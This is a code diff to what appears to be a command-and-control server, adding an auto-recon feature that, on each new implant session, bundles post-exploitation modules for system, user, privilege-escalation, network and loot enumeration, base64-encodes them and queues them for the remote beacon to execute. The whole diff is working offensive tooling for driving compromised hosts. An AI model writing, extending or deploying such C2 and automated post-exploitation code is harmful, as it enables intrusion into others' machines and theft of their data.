@@ -47,9 +47,11 @@ from major.redirector import redirector_from_config
 from major.db import (
     complete_task,
     create_session,
+    create_task,
     get_file,
     get_pending_tasks,
     get_session,
+    get_setting,
     get_task,
     init_db,
     list_sessions,
@@ -70,6 +72,78 @@ REAPER_INTERVAL = _cfg.get("major.reaper_interval", 30)
 
 # Active traffic profile — controls URL routing and response headers
 _profile: TrafficProfile = get_profile(_cfg.get("major.traffic_profile", "default"))
+
+# Auto-recon defaults (from config; runtime overrides stored in DB settings)
+_AUTO_RECON_DEFAULT_ENABLED: bool = bool(_cfg.get("major.auto_recon.enabled", False))
+_AUTO_RECON_DEFAULT_MODULES: list = list(
+    _cfg.get("major.auto_recon.modules", [
+        "enum/sysinfo", "enum/users", "enum/privesc", "enum/network", "enum/loot",
+    ])
+)
+
+
+def _auto_recon_enabled() -> bool:
+    """Check if auto-recon is enabled, preferring DB runtime override."""
+    val = get_setting("auto_recon.enabled")
+    if val is None:
+        return _AUTO_RECON_DEFAULT_ENABLED
+    return bool(val)
+
+
+def _auto_recon_modules() -> list:
+    """Return auto-recon module list, preferring DB runtime override."""
+    val = get_setting("auto_recon.modules")
+    if val is None:
+        return _AUTO_RECON_DEFAULT_MODULES
+    return list(val)
+
+
+def _queue_auto_recon(session_id: str) -> list:
+    """Queue the initial auto-recon task sequence for a new session.
+
+    Returns list of queued task IDs.
+    """
+    modules = _auto_recon_modules()
+    task_ids = []
+    for module in modules:
+        # Bundle module source inline so the beacon can exec() it remotely
+        try:
+            import base64 as _b64
+            import re as _re
+            from pathlib import Path as _Path
+
+            root = _Path(__file__).parent.parent
+            base_src = (root / "post" / "base.py").read_text()
+            register_stub = "\n# loader stub\ndef register(cls):\n    return cls\n\n"
+            rel_parts = module.split("/")
+            module_file = root.joinpath("post", *rel_parts).with_suffix(".py")
+            if not module_file.exists():
+                _log(f"[auto-recon] Module not found, skipping: {module}")
+                continue
+            module_src = module_file.read_text()
+            for pat in (
+                r"^from __future__ import annotations\n",
+                r"^from post\.base import [^\n]+\n",
+                r"^from post\.loader import [^\n]+\n",
+            ):
+                module_src = _re.sub(pat, "", module_src, flags=_re.MULTILINE)
+            bundled = base_src + register_stub + module_src
+            code_b64 = _b64.b64encode(bundled.encode()).decode()
+        except Exception as exc:
+            _log(f"[auto-recon] Bundle error for {module}: {exc}")
+            continue
+
+        task_id = create_task(
+            session_id=session_id,
+            task_type="post",
+            args={"code": code_b64, "module": module, "args": {}},
+        )
+        task_ids.append(task_id)
+
+    if task_ids:
+        _log(f"[auto-recon] Queued {len(task_ids)} module(s) for {session_id}: "
+             f"{', '.join(_auto_recon_modules()[:len(task_ids)])}")
+    return task_ids
 
 
 class UrsaC2Handler(BaseHTTPRequestHandler):
@@ -209,6 +283,10 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
         )
 
         _log(f"[+] New session: {session_id} — {body.get('username', '?')}@{body.get('hostname', '?')} ({client_ip})")
+
+        # Auto-recon: queue initial recon sequence on first registration
+        if _auto_recon_enabled():
+            _queue_auto_recon(session_id)
 
         self._send_json({
             "session_id": session_id,
